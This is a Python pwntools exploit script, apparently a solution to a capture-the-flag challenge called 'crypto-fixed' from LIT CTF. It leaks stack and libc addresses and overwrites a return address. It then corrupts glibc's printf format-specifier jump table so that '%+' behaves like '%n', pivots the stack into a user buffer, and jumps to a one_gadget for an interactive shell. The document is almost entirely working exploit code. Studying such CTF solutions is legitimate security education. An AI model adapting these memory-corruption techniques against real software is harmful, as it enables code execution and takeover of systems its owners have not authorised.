from pwn import *

#init

e = ELF('./crypto-fixed')
libc = ELF('./libc-2.31.so')

p = process(e.path)
#p = remote('crypto.litctf.live', 1337)

#func

def rd(x):
    p.sendlineafter('?\n', str(x))
    return u64(p.recvline(keepends = False).ljust(8, b'\x00'))

def wrt(x, y):
    p.sendlineafter('location.', hex(x))
    p.sendlineafter('code.', p8(y))

def fmt(s):
    p.sendlineafter('?', s)
    p.recvuntil('trade.')

#vars

pop_r12_r15 = 0x401614#04
user_buf = e.sym['user_buf'] 
io_stdout_off = libc.sym['_IO_2_1_stdout_']
jump_table_off = 0x1842c0
one_gadget = 0xcbd1a

log.info('Pop r12 to r15 adr: ' + hex(pop_r12_r15))
log.info('User buf adr: ' + hex(user_buf))
log.info('IO stdout libc off: ' + hex(io_stdout_off))
log.info('Jump table libc off: ' + hex(jump_table_off))
log.info('One gadget libc off: ' + hex(one_gadget))

#exploit

#just fill in

p.sendlineafter('crypto!', '1')

#leak stk adr

stk = rd(-9) - 0x250

log.info('Stk adr: ' + hex(stk))

#overwrite ret on stk to go back to buy_crypto and printf useless now

wrt(stk + 0x238, 0xa4)#0x7f)
fmt('1')

#leak libc on stack

libc_off = rd(42) - io_stdout_off - 131

log.info('Libc off adr: ' + hex(libc_off))

#stk ret to main again and printf still useless

wrt(stk + 0x238, 0xa4)#0x7f)
fmt('1')

#point to position on stack want to overwrite

rd(66)

#overwrite jump table to make fmtstr '%+' work like '%n'

wrt(libc_off + jump_table_off + ord('+') - ord(' '), 0x17)

#fmtstr write rbp to stk pivot to user buf and set up one gadget conditions than call

s = b'%c' * 7
s += b'%' + str(user_buf - 7 + 0x78).encode() + b'c'
s += b'%ll+'
s = s.ljust(0x80, b'\x00')
s += p64(pop_r12_r15)
s += p64(0) * 4
s += p64(libc_off + one_gadget)

gdb.attach(p)

fmt(s)

#pray for flag

p.interactive()

